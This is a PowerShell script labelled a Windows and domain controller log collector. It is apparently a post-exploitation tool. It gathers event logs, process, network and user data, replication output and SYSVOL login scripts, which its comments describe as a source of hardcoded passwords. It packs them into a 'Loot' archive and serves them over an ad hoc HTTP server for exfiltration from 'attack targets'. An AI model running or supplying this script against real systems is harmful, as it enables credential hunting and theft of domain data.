<#
.SYNOPSIS
    Windows & Domain Controller Log Collector
.DESCRIPTION
    General purpose collector. Detects if host is a DC and expands scope 
    to include AD Logs, Sysvol scripts, and Replication status.
.NOTES
    Run as Administrator.
#>

# --- Configuration ---
$Port = 8080
$Hostname = $env:COMPUTERNAME
$Timestamp = Get-Date -Format "yyyyMMdd_HHmm"
$ExportDir = "C:\Windows\Temp\LogExport_$Timestamp"
$ArchiveName = "Loot_$Hostname_$Timestamp.zip"
$FinalPath = Join-Path -Path "C:\Windows\Temp" -ChildPath $ArchiveName

# --- Cleanup (The "Finally" Block) ---
function Remove-Staging {
    Write-Host "`n[!] Cleaning up staging directory..." -ForegroundColor Yellow
    if (Test-Path $ExportDir) {
        Remove-Item -Path $ExportDir -Recurse -Force -ErrorAction SilentlyContinue
    }
    Write-Host "[+] Cleanup Complete." -ForegroundColor Green
}

# --- Main Logic ---

Write-Host "====================================================" -ForegroundColor Cyan
Write-Host "   WINDOWS & DC LOG COLLECTOR    " -ForegroundColor Cyan
Write-Host "====================================================" -ForegroundColor Cyan

# 1. Admin Check
$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $IsAdmin) {
    Write-Error "This script requires Administrator privileges."
    exit
}

Try {
    # 2. DC Detection
    # DomainRole: 0-1 (Workstation), 2-3 (Member Server), 4-5 (Domain Controller)
    $DomainRole = (Get-CimInstance Win32_ComputerSystem).DomainRole
    $IsDC = ($DomainRole -ge 4)

    if ($IsDC) {
        Write-Host "[*] DOMAIN CONTROLLER DETECTED! (Role: $DomainRole)" -ForegroundColor Magenta
        Write-Host "    -> Engaging Extended Collection Scope." -ForegroundColor Magenta
    } else {
        Write-Host "[*] Standard Workstation/Server detected." -ForegroundColor Cyan
    }

    # 3. Prepare Staging
    New-Item -ItemType Directory -Force -Path $ExportDir | Out-Null
    $SysInfoDir = New-Item -ItemType Directory -Force -Path "$ExportDir\System_Info"
    $LogsDir = New-Item -ItemType Directory -Force -Path "$ExportDir\Logs"

    # 4. Volatile Data (General)
    Write-Host "[+] Collecting System State..." -ForegroundColor Green
    
    Get-NetTCPConnection | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess | Export-Csv "$SysInfoDir\Network.csv"
    Get-Process | Select-Object Id,ProcessName,Path,StartTime,User | Export-Csv "$SysInfoDir\Processes.csv"
    Get-LocalUser | Export-Csv "$SysInfoDir\LocalUsers.csv"
    
    # Grab Hosts file
    Copy-Item "C:\Windows\System32\drivers\etc\hosts" -Destination "$SysInfoDir\hosts.txt" -ErrorAction SilentlyContinue

    # 5. Domain Controller Specific Scope
    if ($IsDC) {
        Write-Host "[+] Collecting DC-Specific Artifacts..." -ForegroundColor Magenta
        $DCDir = New-Item -ItemType Directory -Force -Path "$ExportDir\DC_Artifacts"

        # A. Command Outputs (Replication, FSMO, DCDiag)
        Write-Host "    [*] Running DC Diagnostic commands..." -ForegroundColor Yellow
        cmd /c "repadmin /showrepl" > "$DCDir\repadmin_showrepl.txt" 2>&1
        cmd /c "dcdiag /q" > "$DCDir\dcdiag_quiet.txt" 2>&1
        cmd /c "netdom query fsmo" > "$DCDir\fsmo_roles.txt" 2>&1
        cmd /c "nltest /dclist:$env:USERDOMAIN" > "$DCDir\dc_list.txt" 2>&1
        
        # B. SYSVOL (Scripts & Policies)
        # Often contains login scripts with hardcoded passwords or interesting logic
        if (Test-Path "C:\Windows\SYSVOL\domain\scripts") {
            Write-Host "    [*] Copying SYSVOL Scripts..." -ForegroundColor Yellow
            Copy-Item "C:\Windows\SYSVOL\domain\scripts" -Destination "$DCDir\Sysvol_Scripts" -Recurse -ErrorAction SilentlyContinue
        }

        # C. AD Database Info (Not the file itself, just location/size)
        Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" | Out-File "$DCDir\NTDS_Registry_Settings.txt"
    }

    # 6. Event Logs (Dynamic Scope)
    Write-Host "[+] Sweeping Event Logs..." -ForegroundColor Green
    
    # Base Logs
    $TargetLogs = @("System", "Security", "Application", "Microsoft-Windows-PowerShell/Operational")
    
    # Add DC Specific Logs
    if ($IsDC) {
        $TargetLogs += "Directory Service"
        $TargetLogs += "DNS Server"
        $TargetLogs += "DFS Replication"
        $TargetLogs += "Key Management Service"
    }

    foreach ($LogName in $TargetLogs) {
        $Dest = "$LogsDir\$($LogName -replace '[/ ]','_').evtx"
        Try {
            # Use wevtutil to safely export locked logs
            wevtutil epl "$LogName" "$Dest" /ow:true
            Write-Host "    [OK] Exported: $LogName" -ForegroundColor Gray
        } Catch {
            Write-Host "    [SKIP] Log not found or empty: $LogName" -ForegroundColor DarkGray
        }
    }

    # 7. Web Logs (IIS)
    if (Test-Path "C:\inetpub\logs\LogFiles") {
        Write-Host "    [*] Found IIS Logs..." -ForegroundColor Yellow
        Copy-Item "C:\inetpub\logs\LogFiles" -Destination "$LogsDir\IIS_Logs" -Recurse -ErrorAction SilentlyContinue
    }

    # 8. Compression
    Write-Host "[+] Compressing artifacts..." -ForegroundColor Green
    Compress-Archive -Path "$ExportDir\*" -DestinationPath $FinalPath -Force
    Write-Host "[+] Archive created at: $FinalPath" -ForegroundColor Cyan

    # 9. Serving
    # Get Non-Loopback IP
    $IP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" -and $_.InterfaceAlias -notlike "*vEthernet*" } | Select-Object -First 1).IPAddress
    if (-not $IP) { $IP = "127.0.0.1" }

    Write-Host "`n====================================================" -ForegroundColor Yellow
    Write-Host " DOWNLOAD LINK: http://$($IP):$($Port)/$ArchiveName" -ForegroundColor Yellow
    Write-Host " Press CTRL+C to stop the server." -ForegroundColor Yellow
    Write-Host "====================================================" -ForegroundColor Yellow

    Set-Location "C:\Windows\Temp"
    
    # Attempt to use Python (common on attack targets/dev boxes)
    if (Get-Command python -ErrorAction SilentlyContinue) {
        python -m http.server $Port
    } elseif (Get-Command python3 -ErrorAction SilentlyContinue) {
        python3 -m http.server $Port
    } else {
        Write-Host "[!] Python not found." -ForegroundColor Red
        Write-Host "    Exfiltration ready at: $FinalPath"
        Read-Host "Press Enter to cleanup and exit..."
    }

} Catch {
    Write-Error "Critical Error: $($_.Exception.Message)"
} Finally {
    Remove-Staging
}
